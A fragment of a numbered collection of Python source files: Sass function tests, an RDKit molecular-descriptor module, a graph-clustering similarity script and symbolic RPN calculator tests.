calc('\"bc\"')\n\n\ndef test_to_upper_case(calc):\n    # Examples from the Ruby docs\n    assert calc('to-upper-case(abcd)') == calc('ABCD')\n\n\ndef test_to_lower_case(calc):\n    # Examples from the Ruby docs\n    assert calc('to-lower-case(ABCD)') == calc('abcd')\n\n\n# ------------------------------------------------------------------------------\n# Number functions\n\ndef test_percentage(calc):\n    # Examples from the Ruby docs\n    assert calc('percentage(100px / 50px)') == calc('200%')\n\n\ndef test_round(calc):\n    # Examples from the Ruby docs\n    assert calc('round(10.4px)') == calc('10px')\n    assert calc('round(10.6px)') == calc('11px')\n\n\ndef test_ceil(calc):\n    # Examples from the Ruby docs\n    assert calc('ceil(10.4px)') == calc('11px')\n    assert calc('ceil(10.6px)') == calc('11px')\n\n\ndef test_floor(calc):\n    # Examples from the Ruby docs\n    assert calc('floor(10.4px)') == calc('10px')\n    assert calc('floor(10.6px)') == calc('10px')\n\n\ndef test_abs(calc):\n    # Examples from the Ruby docs\n    assert calc('abs(10px)') == calc('10px')\n    assert calc('abs(-10px)') == calc('10px')\n\n\ndef test_min(calc):\n    # Examples from the Ruby docs\n    assert calc('min(1px, 4px)') == calc('1px')\n    assert calc('min(5em, 3em, 4em)') == calc('3em')\n\n\ndef test_max(calc):\n    # Examples from the Ruby docs\n    assert calc('max(1px, 4px)') == calc('4px')\n    assert calc('max(5em, 3em, 4em)') == calc('5em')\n\n\n# ------------------------------------------------------------------------------\n# List functions\n\ndef test_length(calc):\n    # Examples from the Ruby docs\n    assert calc('length(10px)') == calc('1')\n    assert calc('length(10px 20px 30px)') == calc('3')\n\n\ndef test_nth(calc):\n    # Examples from the Ruby docs\n    assert calc('nth(10px 20px 30px, 1)') == calc('10px')\n    assert calc('nth((Helvetica, Arial, sans-serif), 3)') == calc('sans-serif')\n    assert calc('nth((width: 10px, length: 20px), 2)') == calc('length, 20px')\n\n    assert calc('nth(10px 20px 30px, -1)') == calc('30px')\n\n\ndef test_join(calc):\n    # Examples from the Ruby docs\n    assert calc('join(10px 20px, 30px 40px)') == calc('10px 20px 30px 40px')\n    assert calc('join((blue, red), (#abc, #def))') == calc('blue, red, #abc, #def')\n    assert calc('join(10px, 20px)') == calc('10px 20px')\n    assert calc('join(10px, 20px, comma)') == calc('10px, 20px')\n    assert calc('join((blue, red), (#abc, #def), space)') == calc('blue red #abc #def')\n\n\ndef test_append(calc):\n    # Examples from the Ruby docs\n    assert calc('append(10px 20px, 30px)') == calc('10px 20px 30px')\n    assert calc('append((blue, red), green)') == calc('blue, red, green')\n    assert calc('append(10px 20px, 30px 40px)') == calc('10px 20px (30px 40px)')\n    assert calc('append(10px, 20px, comma)') == calc('10px, 20px')\n    assert calc('append((blue, red), green, space)') == calc('blue red green')\n\n    # TODO need to test for commas here\n    assert calc('append((a, b), c)') == calc('a, b, c')\n\n\ndef test_zip(calc):\n    # Examples from the Ruby docs\n    assert calc('zip(1px 1px 3px, solid dashed solid, red green blue)') == calc('1px solid red, 1px dashed green, 3px solid blue')\n\n\ndef test_index(calc):\n    # Examples from the Ruby docs\n    assert calc('index(1px solid red, solid)') == calc('2')\n    assert calc('index(1px solid red, dashed)') == calc('false')\n\n\ndef test_list_separator(calc):\n    # Examples from the Ruby docs\n    assert calc('list-separator(1px 2px 3px)') == calc('space')\n    assert calc('list-separator(1px, 2px, 3px)') == calc('comma')\n    assert calc('list-separator(\"foo\")') == calc('space')\n\n\ndef test_set_nth(calc):\n    # Examples from the Ruby docs\n    assert calc('set-nth($list: 10px 20px 30px, $n: 2, $value: -20px)') == calc('10px -20px 30px')\n\n\n# ------------------------------------------------------------------------------\n# Map functions\n\n\ndef test_map_get(calc):\n    # Examples from the Ruby docs\n    assert calc('map-get((\"foo\": 1, \"bar\": 2), \"foo\")') == calc('1')\n    assert calc('map-get((\"foo\": 1, \"bar\": 2), \"bar\")') == calc('2')\n    assert calc('map-get((\"foo\": 1, \"bar\": 2), \"baz\")') == calc('null')\n\n\ndef test_map_merge(calc):\n    # Examples from the Ruby docs\n    assert calc('map-merge((\"foo\": 1), (\"bar\": 2))') == calc('(\"foo\": 1, \"bar\": 2)')\n    assert calc('map-merge((\"foo\": 1, \"bar\": 2), (\"bar\": 3))') == calc('(\"foo\": 1, \"bar\": 3)')\n\n\ndef test_map_keys(calc):\n    # Examples from the Ruby docs\n    assert calc('map-keys((\"foo\": 1, \"bar\": 2))') == calc('\"foo\", \"bar\"')\n\n\ndef test_map_values(calc):\n    # Examples from the Ruby docs\n    assert calc('map-values((\"foo\": 1, \"bar\": 2))') == calc('1, 2')\n    assert calc('map-values((\"foo\": 1, \"bar\": 2, \"baz\": 1))') == calc('1, 2, 1')\n\n\ndef test_map_has_key(calc):\n    # Examples from the Ruby docs\n    assert calc('map-has-key((\"foo\": 1, \"bar\": 2), \"foo\")') == calc('true')\n    assert calc('map-has-key((\"foo\": 1, \"bar\": 2), \"baz\")') == calc('false')\n\n\n# ------------------------------------------------------------------------------\n# Introspection functions\n\ndef test_type_of(calc):\n    # Examples from the Ruby docs\n    assert calc('type-of(100px)') == calc('number')\n    assert calc('type-of(asdf)') == calc('string')\n    assert calc('type-of(\"asdf\")') == calc('string')\n    assert calc('type-of(true)') == calc('bool')\n    assert calc('type-of(#fff)') == calc('color')\n    assert calc('type-of(blue)') == calc('color')\n\n\ndef test_unit(calc):\n    # Examples from the Ruby docs\n    assert calc('unit(100)') == calc('\"\"')\n    assert calc('unit(100px)') == calc('\"px\"')\n    assert calc('unit(3em)') == calc('\"em\"')\n    assert calc('unit(10px * 5em)') == calc('\"em*px\"')\n    # NOTE: the docs say \"em*px/cm*rem\", but even Ruby sass doesn't actually\n    # return that\n    assert calc('unit(10px * 5em / 30cm / 1rem)') == calc('\"em/rem\"')\n\n\ndef test_unitless(calc):\n    # Examples from the Ruby docs\n    assert calc('unitless(100)') == calc('true')\n    assert calc('unitless(100px)') == calc('false')\n\n\ndef test_comparable(calc):\n    # Examples from the Ruby docs\n    assert calc('comparable(2px, 1px)') == calc('true')\n    assert calc('comparable(100px, 3em)') == calc('false')\n    assert calc('comparable(10cm, 3mm)') == calc('true')\n\n\n# ------------------------------------------------------------------------------\n# Miscellaneous functions\n\ndef test_if(calc):\n    # Examples from the Ruby docs\n    assert calc('if(true, 1px, 2px)') == calc('1px')\n    assert calc('if(false, 1px, 2px)') == calc('2px')\n", "464": "from .autocor import *\nfrom .charge import *\nfrom .connectivity import *\nfrom .constitution import *\nfrom .estate import *\nfrom .fingerprint import *\nfrom .topology import *\nfrom .kappa import *\nfrom .property import *\nfrom .basak import *\nfrom rdkit.Chem import Descriptors as desc\nimport pandas as pd\n\nATSm1 = CalcMoreauBroto(lag=1, tag='m')\nATSm2 = CalcMoreauBroto(lag=2, tag='m')\nATSm3 = CalcMoreauBroto(lag=3, tag='m')\nATSm4 = CalcMoreauBroto(lag=4, tag='m')\nATSm5 = CalcMoreauBroto(lag=5, tag='m')\nATSm6 = CalcMoreauBroto(lag=6, tag='m')\nATSm7 = CalcMoreauBroto(lag=7, tag='m')\nATSm8 = CalcMoreauBroto(lag=8, tag='m')\nATSv1 = CalcMoreauBroto(lag=1, tag='V')\nATSv2 = CalcMoreauBroto(lag=2, tag='V')\nATSv3 = CalcMoreauBroto(lag=3, tag='V')\nATSv4 = CalcMoreauBroto(lag=4, tag='V')\nATSv5 = CalcMoreauBroto(lag=5, tag='V')\nATSv6 = CalcMoreauBroto(lag=6, tag='V')\nATSv7 = CalcMoreauBroto(lag=7, tag='V')\nATSv8 = CalcMoreauBroto(lag=8, tag='V')\nATSe1 = CalcMoreauBroto(lag=1, tag='En')\nATSe2 = CalcMoreauBroto(lag=2, tag='En')\nATSe3 = CalcMoreauBroto(lag=3, tag='En')\nATSe4 = CalcMoreauBroto(lag=4, tag='En')\nATSe5 = CalcMoreauBroto(lag=5, tag='En')\nATSe6 = CalcMoreauBroto(lag=6, tag='En')\nATSe7 = CalcMoreauBroto(lag=7, tag='En')\nATSe8 = CalcMoreauBroto(lag=8, tag='En')\nATSp1 = CalcMoreauBroto(lag=1, tag='alpha')\nATSp2 = CalcMoreauBroto(lag=2, tag='alpha')\nATSp3 = CalcMoreauBroto(lag=3, tag='alpha')\nATSp4 = CalcMoreauBroto(lag=4, tag='alpha')\nATSp5 = CalcMoreauBroto(lag=5, tag='alpha')\nATSp6 = CalcMoreauBroto(lag=6, tag='alpha')\nATSp7 = CalcMoreauBroto(lag=7, tag='alpha')\nATSp8 = CalcMoreauBroto(lag=8, tag='alpha')\n\nMATSm1 = CalcMorean(lag=1, tag='m')\nMATSm2 = CalcMorean(lag=2, tag='m')\nMATSm3 = CalcMorean(lag=3, tag='m')\nMATSm4 = CalcMorean(lag=4, tag='m')\nMATSm5 = CalcMorean(lag=5, tag='m')\nMATSm6 = CalcMorean(lag=6, tag='m')\nMATSm7 = CalcMorean(lag=7, tag='m')\nMATSm8 = CalcMorean(lag=8, tag='m')\nMATSv1 = CalcMorean(lag=1, tag='V')\nMATSv2 = CalcMorean(lag=2, tag='V')\nMATSv3 = CalcMorean(lag=3, tag='V')\nMATSv4 = CalcMorean(lag=4, tag='V')\nMATSv5 = CalcMorean(lag=5, tag='V')\nMATSv6 = CalcMorean(lag=6, tag='V')\nMATSv7 = CalcMorean(lag=7, tag='V')\nMATSv8 = CalcMorean(lag=8, tag='V')\nMATSe1 = CalcMorean(lag=1, tag='En')\nMATSe2 = CalcMorean(lag=2, tag='En')\nMATSe3 = CalcMorean(lag=3, tag='En')\nMATSe4 = CalcMorean(lag=4, tag='En')\nMATSe5 = CalcMorean(lag=5, tag='En')\nMATSe6 = CalcMorean(lag=6, tag='En')\nMATSe7 = CalcMorean(lag=7, tag='En')\nMATSe8 = CalcMorean(lag=8, tag='En')\nMATSp1 = CalcMorean(lag=1, tag='alpha')\nMATSp2 = CalcMorean(lag=2, tag='alpha')\nMATSp3 = CalcMorean(lag=3, tag='alpha')\nMATSp4 = CalcMorean(lag=4, tag='alpha')\nMATSp5 = CalcMorean(lag=5, tag='alpha')\nMATSp6 = CalcMorean(lag=6, tag='alpha')\nMATSp7 = CalcMorean(lag=7, tag='alpha')\nMATSp8 = CalcMorean(lag=8, tag='alpha')\n\nGATSm1 = CalcGerary(lag=1, tag='m')\nGATSm2 = CalcGerary(lag=2, tag='m')\nGATSm3 = CalcGerary(lag=3, tag='m')\nGATSm4 = CalcGerary(lag=4, tag='m')\nGATSm5 = CalcGerary(lag=5, tag='m')\nGATSm6 = CalcGerary(lag=6, tag='m')\nGATSm7 = CalcGerary(lag=7, tag='m')\nGATSm8 = CalcGerary(lag=8, tag='m')\nGATSv1 = CalcGerary(lag=1, tag='V')\nGATSv2 = CalcGerary(lag=2, tag='V')\nGATSv3 = CalcGerary(lag=3, tag='V')\nGATSv4 = CalcGerary(lag=4, tag='V')\nGATSv5 = CalcGerary(lag=5, tag='V')\nGATSv6 = CalcGerary(lag=6, tag='V')\nGATSv7 = CalcGerary(lag=7, tag='V')\nGATSv8 = CalcGerary(lag=8, tag='V')\nGATSe1 = CalcGerary(lag=1, tag='En')\nGATSe2 = CalcGerary(lag=2, tag='En')\nGATSe3 = CalcGerary(lag=3, tag='En')\nGATSe4 = CalcGerary(lag=4, tag='En')\nGATSe5 = CalcGerary(lag=5, tag='En')\nGATSe6 = CalcGerary(lag=6, tag='En')\nGATSe7 = CalcGerary(lag=7, tag='En')\nGATSe8 = CalcGerary(lag=8, tag='En')\nGATSp1 = CalcGerary(lag=1, tag='alpha')\nGATSp2 = CalcGerary(lag=2, tag='alpha')\nGATSp3 = CalcGerary(lag=3, tag='alpha')\nGATSp4 = CalcGerary(lag=4, tag='alpha')\nGATSp5 = CalcGerary(lag=5, tag='alpha')\nGATSp6 = CalcGerary(lag=6, tag='alpha')\nGATSp7 = CalcGerary(lag=7, tag='alpha')\nGATSp8 = CalcGerary(lag=8, tag='alpha')\n\nSPP = CalcSubmolPolarityPara\nLDI = CalcLocalDipoleIndex\nRnc = CalcElementCharge(0, reln_sum)\nRpc = CalcElementCharge(0, relp_sum)\nMac = CalcElementCharge(0, abs_mean)\nTac = CalcElementCharge(0, abs_sum)\nMnc = CalcElementCharge(0, n_mean)\nTnc = CalcElementCharge(0, n_sum)\nMpc = CalcElementCharge(0, p_mean)\nTpc = CalcElementCharge(0, p_sum)\nQass = CalcElementCharge(0, sqsum)\nQOss = CalcElementCharge(6, sqsum)\nQNss = CalcElementCharge(7, sqsum)\nQCss = CalcElementCharge(8, sqsum)\nQHss = CalcElementCharge(1, sqsum)\nQmin = CalcElementCharge(0, np.min)\nQOmin = CalcElementCharge(6, np.min)\nQNmin = CalcElementCharge(7, np.min)\nQCmin = CalcElementCharge(8, np.min)\nQHmin = CalcElementCharge(1, np.min)\nQmax = CalcElementCharge(0, np.max)\nQOmax = CalcElementCharge(6, np.max)\nQNmax = CalcElementCharge(7, np.max)\nQCmax = CalcElementCharge(8, np.max)\nQHmax = CalcElementCharge(1, np.max)\n\nmChi1 = MeanRandic\nChi0 = Chinp(n_path=0)\nChi1 = Chinp(n_path=0)\nChi2 = Chinp(n_path=2)\nChi3 = Chinp(n_path=3)\nChi4 = Chinp(n_path=4)\nChi5 = Chinp(n_path=5)\nChi6 = Chinp(n_path=6)\nChi7 = Chinp(n_path=7)\nChi8 = Chinp(n_path=8)\nChi9 = Chinp(n_path=9)\nChi10 = Chinp(n_path=10)\nChi3c = Chinc(tag='3', is_hk=False)\nChi4c = Chinc(tag='4', is_hk=False)\nChi4pc = Chinc(tag='4p', is_hk=False)\nChi3ch = Chinch(n_cycle=3)\nChi4ch = Chinch(n_cycle=4)\nChi5ch = Chinch(n_cycle=5)\nChi6ch = Chinch(n_cycle=6)\nChiv0 = Chivnp(n_path=0)\nChiv1 = Chivnp(n_path=1)\nChiv2 = Chivnp(n_path=2)\nChiv3 = Chivnp(n_path=3)\nChiv4 = Chivnp(n_path=4)\nChiv5 = Chivnp(n_path=5)\nChiv6 = Chivnp(n_path=6)\nChiv7 = Chivnp(n_path=7)\nChiv8 = Chivnp(n_path=8)\nChiv9 = Chivnp(n_path=9)\nChiv10 = Chivnp(n_path=10)\ndchi0 = DeltaChi(Chivnp(0), Chinp(0))\ndchi1 = DeltaChi(Chivnp(1), Chinp(1))\ndchi2 = DeltaChi(Chivnp(2), Chinp(2))\ndchi3 = DeltaChi(Chivnp(3), Chinp(3))\ndchi4 = DeltaChi(Chivnp(4), Chinp(4))\nChiv3c = Chinc(tag='3', is_hk=True)\nChiv4c = Chinc(tag='4', is_hk=True)\nChiv4pc = Chinc(tag='4p', is_hk=True)\nChiv3ch = Chivnch(n_cycle=3)\nChiv4ch = Chivnch(n_cycle=4)\nChiv5ch = Chivnch(n_cycle=5)\nChiv6ch = Chivnch(n_cycle=6)\nknotpv = DeltaChi(Chinc(tag='3', is_hk=True), Chinc(tag='4p', is_hk=True))\nknotp = DeltaChi(Chinc(tag='3', is_hk=False), Chinc(tag='4p', is_hk=False))\n\nWeight = desc.MolWt\nnhyd = FragCounter('[H]')\nnhal = FragCounter('[F,Cl,Br,I]')\nnhet = AllChem.CalcNumHeteroatoms\nnring = AllChem.CalcNumRings\nnrot = AllChem.CalcNumRotatableBonds\nndonr = AllChem.CalcNumHBD\nnaccr = AllChem.CalcNumHBA\n\nnhev = FragCounter('[!H]')\nncof = FragCounter('F')\nncocl = FragCounter('Cl')\nncobr = FragCounter('Br')\nncoi = FragCounter('I')\nncarb = FragCounter('C')\nnphos = FragCounter('P')\nnsulph = FragCounter('S')\nnoxy = FragCounter('O')\nnnitro = FragCounter('N')\nnsb = FragCounter('[*]-[*]')\nndb = FragCounter('[*]=[*]')\nntb = FragCounter('[*]#[*]')\nnaro = FragCounter('[*]:[*]')\nnta = TotalAtom()\nAWeight = TotalAtom(is_weight=True)\nPC1 = PathsOfLengthN(1)\nPC2 = PathsOfLengthN(2)\nPC3 = PathsOfLengthN(3)\nPC4 = PathsOfLengthN(4)\nPC5 = PathsOfLengthN(5)\nPC6 = PathsOfLengthN(6)\n\nvalue = CalcEstateValue\nmax = CalcMaxAtomTypeEState\nmin = CalcMinAtomTypeEState\nShev = CalcHeavyAtomEState\nScar = CalcCAtomEState\nShal = CalculateHalogenEState\nShet = CalculateHeteroEState\nSave = CalcAverageEState\nSmax = CalcMaxEState\nSmin = CalcMinEState\nDS = CalcDiffMaxMinEState\n\nslogPVSA = MolSurf.SlogP_VSA_\nMRVSA = MolSurf.SMR_VSA_\nPEOEVSA = MolSurf.PEOE_VSA_\nEstateVSA = EVSA.EState_VSA_\nVSAEstate = EVSA.VSA_EState_\n\ntopological = CalcDaylightFingerprint\nEstate = CalcEstateFingerprint\natompairs = CalcAtomPairsFingerprint\ntorsions = CalculateTopologicalTorsionFingerprint\n# morgan = CalculateMorganFingerprint\nECFP4 = CalcMorganFingerprint(radius=2, useFeatures=False)\nECFP6 = CalcMorganFingerprint(radius=3, useFeatures=False)\nFCFP4 = CalcMorganFingerprint(radius=2, useFeatures=True)\nFCFP6 = CalcMorganFingerprint(radius=3, useFeatures=True)\nMACCS = CalculateMACCSFingerprint\n\nW = WienerIdx()\nAW = WienerIdx(is_average=True)\nJ = graph.BalabanJ\nThara = NumHarary\nTsch = SchiultzIdx\nTigdi = GraphDistIdx\nPlatt = CalcPlatt\nXu = XuIdx\nPol = NumPolarity\nDz = PoglianiIdx\nIpc = IpcIdx\nBertzCT = BertzCT\nGMTI = GutmanTopo\nZM1 = Zagreb1\nZM2 = Zagreb2\nMZM1 = MZagreb1\nMZM2 = MZagreb2\nQindex = Quadratic\ndiametert = Diameter\nradiust = Radius\npetitjeant = Petitjean\nSito = SimpleTopovIdx\nHato = HarmonicTopovIdx\nGeto = GeometricTopovIdx\nArto = ArithmeticTopoIdx\n\nkappa1 = CalcKappa(is_alpha=False, n_bond=1)\nkappa2 = CalcKappa(is_alpha=False, n_bond=2)\nkappa3 = CalcKappa(is_alpha=False, n_bond=3)\nkappam1 = CalcKappa(is_alpha=True, n_bond=1)\nkappam2 = CalcKappa(is_alpha=True, n_bond=2)\nkappam3 = CalcKappa(is_alpha=True, n_bond=3)\nphi = Flexibility\n\nLogP = Crippen.MolLogP\nMR = Crippen.MolMR\nLabuteASA = MS.pyLabuteASA\nTPSA = MS.TPSA\nHy = CalculateHydrophilicityFactor\nUI = CalculateUnsaturationIndex\n\n# Basak\nCIC0 = CalcBasakCIC0\nCIC1 = CalcBasakCICn(num_path=2)\nCIC2 = CalcBasakCICn(num_path=3)\nCIC3 = CalcBasakCICn(num_path=4)\nCIC4 = CalcBasakCICn(num_path=5)\nCIC5 = CalcBasakCICn(num_path=6)\nCIC6 = CalcBasakCICn(num_path=7)\nSIC0 = CalcBasakSIC0\nSIC1 = CalcBasakSICn(num_path=2)\nSIC2 = CalcBasakSICn(num_path=3)\nSIC3 = CalcBasakSICn(num_path=4)\nSIC4 = CalcBasakSICn(num_path=5)\nSIC5 = CalcBasakSICn(num_path=6)\nSIC6 = CalcBasakSICn(num_path=7)\nIC0 = CalcBasakIC0\nIC1 = CalcBasakICn(num_path=2)\nIC2 = CalcBasakICn(num_path=3)\nIC3 = CalcBasakICn(num_path=4)\nIC4 = CalcBasakICn(num_path=5)\nIC5 = CalcBasakICn(num_path=6)\nIC6 = CalcBasakICn(num_path=7)\n\n# Burden\nfrom .burden import *\nbcutp = CalcBurden(label='alpha')\nbcute = CalcBurden(label='En')\nbcutv = CalcBurden(label='V')\nbcutm = CalcBurden(label='m')\n\n# Pharmacophore\nfrom .cats import *\n", "465": "from scipy import *\n\ndef parsefile(infile):\n    results = []\n    with open(infile) as filein:\n        for line in filein:\n            results.append(line.strip().split(' '))\n\n    data = []\n    for (idx,row) in enumerate(results):\n        data.append([])\n        for i in row:\n            data[idx].append(int(i))\n\n    N = 0\n    G = dict()\n    for (idx, line) in enumerate(data):\n        G[idx] = set()\n        for elem in line:\n            G[idx].add(elem)\n        N += len(G[idx])\n    return (G, N)\n\ndef determine_R_prime(base_folder, calc_folder, infilename_root, outfile):\n    outfile.write('t\\tR\\' %s\\n' % infilename_root)\n    for t in [1, 2, 3, 4, 5, 6, 7, 8]:\n\n        infilename_base_full = base_folder + infilename_root + '_gen_calc.txt'\n        infilename_calc_full = calc_folder + infilename_root + '_gen_graph_t' + str(t) + '_calc.txt'\n\n        # infilename_base_full = base_folder + infilename_base + '.txt'\n        # infilename_calc_full = calc_folder + infilename_calc + '.txt'\n\n        (G_base, N1) = parsefile(infilename_base_full)\n        (G_calc, N2) = parsefile(infilename_calc_full)\n\n        if N1 != N2:\n            outfile.write('%s\\tERROR -> N1 != N2\\n' % t)\n        else:\n            N = N1\n            SumNormC1i2 = 0\n            SumNormC2j2 = 0\n            for C1i in G_base:\n                cnt = len(G_base[C1i])\n                SumNormC1i2 += cnt * cnt\n            for C2j in G_calc:\n                cnt = len(G_calc[C2j])\n                SumNormC2j2 += cnt * cnt\n\n            SumC1i_inter_C2j2 = 0\n            for C1i in G_base:\n                for C2j in G_calc:\n                    Cinter = G_base[C1i].intersection(G_calc[C2j])\n                    cnt = len(Cinter)\n                    SumC1i_inter_C2j2 += cnt * cnt\n\n            Rprime = (N * N * SumC1i_inter_C2j2 - SumNormC1i2 * SumNormC2j2) / (\n            0.5 * N * N * (SumNormC1i2 + SumNormC2j2) - SumNormC1i2 * SumNormC2j2)\n\n            print 'R\\' = %s' % Rprime\n            outfile.write('%s\\t%s\\n' % (t, Rprime))\n\n    outfile.write('\\n')\n\n\ndef main():\n    #infilename_base = 'nreq600_k2_alpha2_qe0.4_(n600)_gen_calc'\n    #infilename_calc = 'nreq600_k2_alpha2_qe0.4_(n600)_gen_graph_t1_calc'\n\n    base_folder = 'in/GRAPH3extra/'\n    calc_folder = 'out/GRAPH3extra/'\n    outfilename = 'out/RprimeGRAPH3extra.txt'\n    outfile = open(outfilename, \"w\")\n\n    # for (infilename_base, infilename_calc) in \\\n    # [ \\\n    #     ( 'nreq600_k2_alpha2_qe0.4_(n600)_gen_calc', 'nreq600_k2_alpha2_qe0.4_(n600)_gen_graph_t1_calc' ), \\\n    #     ( 'nreq600_k2_alpha2_qe0.4_(n600)_gen_calc', 'nreq600_k2_alpha2_qe0.4_(n600)_gen_graph_t2_calc' ), \\\n    #     ( 'nreq600_k2_alpha2_qe0.4_(n600)_gen_calc', 'nreq600_k2_alpha2_qe0.4_(n600)_gen_graph_t3_calc' ), \\\n    #     ( 'nreq600_k2_alpha2_qe0.4_(n600)_gen_calc', 'nreq600_k2_alpha2_qe0.4_(n600)_gen_graph_t4_calc' ), \\\n    #     ( 'nreq600_k2_alpha2_qe0.4_(n600)_gen_calc', 'nreq600_k2_alpha2_qe0.4_(n600)_gen_graph_t5_calc' ), \\\n    #     ( 'nreq600_k2_alpha2_qe0.4_(n600)_gen_calc', 'nreq600_k2_alpha2_qe0.4_(n600)_gen_graph_t6_calc' ), \\\n    #     ( 'nreq600_k2_alpha2_qe0.4_(n600)_gen_calc', 'nreq600_k2_alpha2_qe0.4_(n600)_gen_graph_t7_calc' ), \\\n    #     ( 'nreq600_k2_alpha2_qe0.4_(n600)_gen_calc', 'nreq600_k2_alpha2_qe0.4_(n600)_gen_graph_t8_calc' )\n    # ]:\n\n    #GRAPH1\n    # for infilename_root in \\\n    # [ \\\n    #         'nreq600_k2_alpha2_qe0.4_(n600)', \\\n    #         'nreq600_k3_alpha2_qe0.4_(n600)', \\\n    #         'nreq600_k5_alpha2_qe0.4_(n600)', \\\n    #         'nreq600_k6_alpha2_qe0.4_(n600)', \\\n    #         'nreq600_k12_alpha2_qe0.4_(n600)', \\\n    #         'nreq600_k24_alpha2_qe0.4_(n600)', \\\n    #         'nreq600_k36_alpha2_qe0.4_(n576)' \\\n    # ]:\n\n    # GRAPH2\n    # for infilename_root in \\\n    # [ \\#\n    #     'nreq300_k10_alpha2_qe0.4_(n300)', \\\n    #     'nreq600_k10_alpha2_qe0.4_(n600)', \\\n    #     'nreq900_k10_alpha2_qe0.4_(n900)', \\\n    #     'nreq1200_k10_alpha2_qe0.4_(n1200)' \\\n    # ]:\n\n    # GRAPH3\n    # for infilename_root in \\\n    # [ \\\n    #     'nreq600_k5_alpha2_qe0.1_(n6# 00)', \\\n    #     'nreq600_k5_alpha2_qe0.2_(n600)', \\\n    #     'nreq600_k5_alpha2_qe0.3_(n600)', \\\n    #     'nreq600_k5_alpha2_qe0.4_(n600)', \\\n    #     'nreq600_k5_alpha2_qe0.5_(n600)', \\\n    #     'nreq600_k5_alpha2_qe0.6_(n600)', \\\n    #     'nreq600_k5_alpha2_qe0.7_(n600)' \\\n    # ]:\n\n    # GRAPH3extra\n    for infilename_root in \\\n    [ \\\n        'nreq600_k5_alpha2_qe0.32_(n600)', \\\n        'nreq600_k5_alpha2_qe0.34_(n600)', \\\n        'nreq600_k5_alpha2_qe0.36_(n600)', \\\n        'nreq600_k5_alpha2_qe0.38_(n600)' \\\n    ]:\n\n    # GRAPH4\n    # for infilename_root in \\\n    # [ \\\n    #   'nreq600_k5_alpha1_qe0.4_(n600)', \\\n    #   'nreq600_k5_alpha2_qe0.4_(n600)', \\\n    #   'nreq600_k5_alpha3_qe0.4_(n600)', \\\n    #   'nreq600_k5_alpha4_qe0.4_(n600)', \\\n    #   'nreq600_k5_alpha5_qe0.4_(n600)', \\\n    #   'nreq600_k5_alpha6_qe0.4_(n600)', \\\n    #   'nreq600_k5_alpha7_qe0.4_(n600)', \\\n    # ]:\n\n        determine_R_prime(base_folder, calc_folder, infilename_root, outfile)\n\n    outfile.close()\n    return\n\nif __name__ == '__main__':\n    main()", "466": "# -*- coding: utf-8 -*-\n\nfrom symcalc import RPN,N\n\ncalc = RPN()\n#calc.run()\n\n# op0\nassert calc.rpn('x') == 'x'\nassert calc.rpn('y') == 'y'\nassert calc.rpn('z') == 'z'\nassert calc.rpn('oo') == 'oo'\nassert calc.rpn('inf') == 'oo'\nassert calc.rpn('infinity') == 'oo'\n\n# op1\nassert calc.rpn('0 sin') == '0'\nassert calc.rpn('pi/2 sin') == '1'\nassert calc.rpn('pi sin') == '0'\nassert calc.rpn('3*pi/2 sin') == '-1'\n\nassert calc.rpn('0 radians sin') == '0'\nassert calc.rpn('90 radians sin') == '1'\nassert calc.rpn('180 radians sin') == '0'\nassert calc.rpn('270 radians sin') == '-1'\n\nassert calc.rpn('x sin') == 'sin(x)'\nassert calc.rpn('x cos') == 'cos(x)'\nassert calc.rpn('x tan') == 'tan(x)'\nassert calc.rpn('x sq') == 'x**2'\nassert calc.rpn('x sqrt') == 'sqrt(x)'\nassert calc.rpn('x log') == 'log(x)'\nassert calc.rpn('x ln') == 'log(x)'\nassert calc.rpn('x exp') == 'exp(x)'\nassert calc.rpn('x cos sq x sin sq +') == 'sin(x)**2 + cos(x)**2'\nassert calc.rpn('x cos sq x sin sq + simplify') == '1'\nassert calc.rpn('[1,2,3]') == '[1, 2, 3]'\nassert calc.rpn('[1,2,3] polynom') == '3*x**2 + 2*x + 1'\nassert calc.rpn('x inv') == '1/x'\nassert calc.rpn('x chs') == '-x'\nassert calc.rpn('x 1 + x 2 + *') == '(x + 1)*(x + 2)'\nassert calc.rpn('x 1 + x 2 + * expand') == 'x**2 + 3*x + 2'\nassert calc.rpn('x**2 xdiff') == '2*x'\nassert calc.rpn('x*y**2 ydiff') == '2*x*y'\nassert calc.rpn('x**2 xint') == 'x**3/3'\nassert calc.rpn('x**2-1 xsolve') == '[-1, 1]'\nassert calc.rpn('x**4-1 xsolve') == '[-1, 1, -I, I]'\nassert calc.rpn('1/((x+2)*(x+1)) xapart') == '-1/(x + 2) + 1/(x + 1)'\nassert calc.rpn('-1/(x+2)+1/(x+1) xtogether') == '1/((x + 1)*(x + 2))'\nassert calc.rpn('0 0 point 3 circle center') == 'Point2D(0, 0)'\nassert calc.rpn('0 0 point 3 circle radius') == '3'\nassert calc.rpn('0 0 point 0 1 point 1 0 point triangle incircle') == 'Circle(Point2D(-sqrt(2)/2 + 1, -sqrt(2)/2 + 1), -sqrt(2)/2 + 1)'\n\n# op2\nassert calc.rpn('x x +') == '2*x'\nassert calc.rpn('2 3 -') == '-1'\nassert calc.rpn('x x *') == 'x**2'\nassert calc.rpn('2 3 /') == '2/3'\nassert calc.rpn('x**2 x diff') == '2*x'\nassert calc.rpn('x**2 x int') == 'x**3/3'\nassert calc.rpn('x**4-1 x solve') == '[-1, 1, -I, I]'\nassert calc.rpn('[x+y-4,x-y+2] [x,y] solve') == '{x: 1, y: 3}'\nassert calc.rpn('x**3 3 xeval') == '27'\nassert calc.rpn('[11,12,13] 0 item') == '11'\nassert calc.rpn('1 2 point') == 'Point2D(1, 2)'\nassert calc.rpn('1 2 point 3 4 point line') == 'Line(Point2D(1, 2), Point2D(3, 4))'\nassert calc.rpn('1 2 point 3 circle') == 'Circle(Point2D(1, 2), 3)'\nassert calc.rpn('0 0 point 1 circle 0 2 point tangent_lines') == '[Line(Point2D(0, 2), Point2D(-sqrt(3)/2, 1/2)), Line(Point2D(0, 2), Point2D(sqrt(3)/2, 1/2))]'\nassert calc.rpn('-1 -1 point 1 1 point line 1 -1 point -1 1 point line intersection') == '[Point2D(0, 0)]'\nassert calc.rpn('0 0 point 1 circle 0 0 point 1 1 point line intersection') == '[Point2D(-sqrt(2)/2, -sqrt(2)/2), Point2D(sqrt(2)/2, sqrt(2)/2)]'\nassert calc.rpn('0 0 point 1 1 point line 3 4 point perpendicular_line') == 'Line(Point2D(3, 4), Point2D(4, 3))'\nassert calc.rpn('x**2 x diff') == '2*x'\nassert calc.rpn('x**2 x int') == 'x**3/3'\nassert calc.rpn('1/((x+2)*(x+1)) x apart') == '-1/(x + 2) + 1/(x + 1)'\nassert calc.rpn('-1/(x+2)+1/(x+1) x together') == 